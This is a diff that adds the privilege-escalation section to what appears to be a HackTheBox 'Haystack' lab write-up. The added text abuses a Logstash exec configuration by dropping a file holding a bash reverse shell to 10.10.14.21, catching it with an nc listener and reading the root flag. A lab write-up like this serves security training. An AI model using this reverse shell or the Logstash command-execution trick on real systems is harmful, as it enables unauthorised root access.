@@ -190,3 +190,63 @@ No need to read all of it, the important part is the <b>logstash</b>. We can see
 bash-4.2$ ls conf.d/
 filter.conf  input.conf  output.conf
 ```
+Reading each file shows us that it looks for a file in <b>/opt/kibana</b> that starts with <b>logstash_</b> and then reads the file and executes it if it matches the filters criteria.
+```
+$ cat filter.conf
+filter {
+        if [type] == "execute" {
+                grok {
+                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
+                }
+        }
+}
+
+$ cat input.conf
+input {
+        file {
+                path => "/opt/kibana/logstash_*"
+                start_position => "beginning"
+                sincedb_path => "/dev/null"
+                stat_interval => "10 second"
+                type => "execute"
+                mode => "read"
+        }
+}
+
+$ cat output.conf
+output {
+        if [type] == "execute" {
+                stdout { codec => json }
+                exec {
+                        command => "%{comando} &"
+                }
+        }
+}
+```
+I used *[this](https://grokdebug.herokuapp.com/)* website to test my command. Only took a few tries to get it right
+
+<center><img src="/htb/haystack/grok.png"></center>
+<br>
+Now lets add that command into a file name <b>logstash_shell</b> and make it executable
+```
+# echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.21/10000 0>&1" > logstash_shell
+
+# chmod +x logstash_shell
+```
+Make sure you have your <b>nc</b> listener ready and I decided to include the <b>-k</b> option since the shell sometimes connects/disconnects multiple times so I didn't want the listener to have the same problem. Eventually you should have a root shell spawn.
+```
+# nc -lkvnp 10000                                                                                                                           
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                                                                                                          
+Ncat: Listening on :::10000                                                                                                                                           
+Ncat: Listening on 0.0.0.0:10000                                                                                                                                      
+Ncat: Connection from 10.10.10.115.
+Ncat: Connection from 10.10.10.115:54928.
+bash: no hay control de trabajos en este shell
+[root@haystack /]#
+```
+Now you can read the the root flag
+```
+[root@haystack /]# cat /root/root.txt                                                   
+3f5f727c38d9f70****************
+```
+<br><br><br>
